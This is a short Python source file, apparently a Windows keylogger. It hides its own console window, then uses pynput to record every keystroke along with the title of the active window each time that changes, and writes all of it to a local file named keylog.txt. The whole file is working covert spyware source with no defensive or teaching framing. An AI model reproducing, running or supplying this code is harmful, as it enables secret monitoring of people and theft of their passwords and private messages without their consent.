import os
import sys
import time
import logging
from pynput import keyboard
import win32gui
import ctypes

#para a janela do console
def hide_window():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

hide_window()


logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s : %(message)s")

last_window = ''

def get_active_window():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def log_window_change():
    global last_window
    current_window = get_active_window()
    if current_window != last_window:
        last_window = current_window
        logging.info(f"Window Changed to {current_window}")


def on_press(key):
    log_window_change()
    try:
        logging.info(f"Key: {key.char}")
    except AttributeError:
        logging.info(f"Special Key: {key}")



keyboard.Listener(on_press=on_press).join()